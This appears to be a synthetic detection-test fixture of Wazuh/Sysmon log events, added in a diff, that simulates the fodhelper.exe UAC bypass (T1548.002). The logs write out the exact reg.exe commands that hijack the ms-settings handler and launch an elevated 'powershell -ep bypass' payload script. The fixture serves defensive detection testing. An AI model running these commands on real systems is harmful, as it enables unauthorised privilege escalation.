@@ -1,0 +1,377 @@
+{
+  "_metadata": {
+    "attack_id": "T1548.002",
+    "variation": "001",
+    "name": "fodhelper.exe UAC Bypass",
+    "description": "UAC bypass using fodhelper.exe registry hijack",
+    "expected_detection": "HIGH",
+    "expected_soar": "privilege-escalation-detection",
+    "kill_chain_phase": "privilege-escalation",
+    "notes": "Classic UAC bypass - registry modification followed by auto-elevated binary execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - reg.exe setting up bypass",
+      "sequence": 1,
+      "timestamp": "2026-01-29T13:30:00.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: fodhelper.exe UAC Bypass",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1548.002"
+            ],
+            "tactic": [
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "fodhelper.exe UAC Bypass"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "007",
+          "name": "WS01",
+          "ip": "10.1.0.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.828662757",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 13:30:00.000",
+              "processGuid": "{A1B2C3D4-2001-2001-2001-000000000001}",
+              "processId": "16000",
+              "image": "C:\\Windows\\System32\\reg.exe",
+              "commandLine": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe /c powershell.exe -ep bypass -file C:\\Users\\Public\\payload.ps1\" /f",
+              "currentDirectory": "C:\\Users\\john.doe\\",
+              "user": "CORP\\john.doe",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{A1B2C3D4-2001-2001-2001-000000000000}",
+              "parentProcessId": "15800",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 13 - Registry value set for bypass",
+      "sequence": 2,
+      "timestamp": "2026-01-29T13:30:01.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 13: fodhelper.exe UAC Bypass",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1548.002"
+            ],
+            "tactic": [
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "fodhelper.exe UAC Bypass"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event13",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "007",
+          "name": "WS01",
+          "ip": "10.1.0.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.85163980",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "13",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 13:30:01.000",
+              "eventType": "SetValue",
+              "processGuid": "{A1B2C3D4-2001-2001-2001-000000000001}",
+              "processId": "16000",
+              "image": "C:\\Windows\\System32\\reg.exe",
+              "targetObject": "HKU\\S-1-5-21-1234567890-1234567890-1234567890-1001\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)",
+              "details": "C:\\Windows\\System32\\cmd.exe /c powershell.exe -ep bypass -file C:\\Users\\Public\\payload.ps1",
+              "user": "CORP\\john.doe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - reg.exe setting DelegateExecute",
+      "sequence": 3,
+      "timestamp": "2026-01-29T13:30:02.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: fodhelper.exe UAC Bypass",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1548.002"
+            ],
+            "tactic": [
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "fodhelper.exe UAC Bypass"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "007",
+          "name": "WS01",
+          "ip": "10.1.0.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.995889798",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 13:30:02.000",
+              "processGuid": "{A1B2C3D4-2001-2001-2001-000000000002}",
+              "processId": "16100",
+              "image": "C:\\Windows\\System32\\reg.exe",
+              "commandLine": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f",
+              "currentDirectory": "C:\\Users\\john.doe\\",
+              "user": "CORP\\john.doe",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{A1B2C3D4-2001-2001-2001-000000000000}",
+              "parentProcessId": "15800",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - fodhelper.exe triggering bypass",
+      "sequence": 4,
+      "timestamp": "2026-01-29T13:30:03.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: fodhelper.exe UAC Bypass",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1548.002"
+            ],
+            "tactic": [
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "fodhelper.exe UAC Bypass"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "007",
+          "name": "WS01",
+          "ip": "10.1.0.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.264663926",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 13:30:03.000",
+              "processGuid": "{A1B2C3D4-2001-2001-2001-000000000003}",
+              "processId": "16200",
+              "image": "C:\\Windows\\System32\\fodhelper.exe",
+              "commandLine": "C:\\Windows\\System32\\fodhelper.exe",
+              "currentDirectory": "C:\\Users\\john.doe\\",
+              "user": "CORP\\john.doe",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{A1B2C3D4-2001-2001-2001-000000000000}",
+              "parentProcessId": "15800",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - Elevated cmd.exe spawned",
+      "sequence": 5,
+      "timestamp": "2026-01-29T13:30:04.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: fodhelper.exe UAC Bypass",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1548.002"
+            ],
+            "tactic": [
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "fodhelper.exe UAC Bypass"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "007",
+          "name": "WS01",
+          "ip": "10.1.0.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.167990140",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "opcode": "0",
+              "keywords": "0x8000000000000000",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-01-29 13:30:04.000",
+              "processGuid": "{A1B2C3D4-2001-2001-2001-000000000004}",
+              "processId": "16300",
+              "image": "C:\\Windows\\System32\\cmd.exe",
+              "commandLine": "C:\\Windows\\System32\\cmd.exe /c powershell.exe -ep bypass -file C:\\Users\\Public\\payload.ps1",
+              "currentDirectory": "C:\\Users\\john.doe\\",
+              "user": "CORP\\john.doe",
+              "integrityLevel": "High",
+              "parentProcessGuid": "{A1B2C3D4-2001-2001-2001-000000000003}",
+              "parentProcessId": "16200",
+              "parentImage": "C:\\Windows\\System32\\fodhelper.exe",
+              "parentCommandLine": "C:\\Windows\\System32\\fodhelper.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
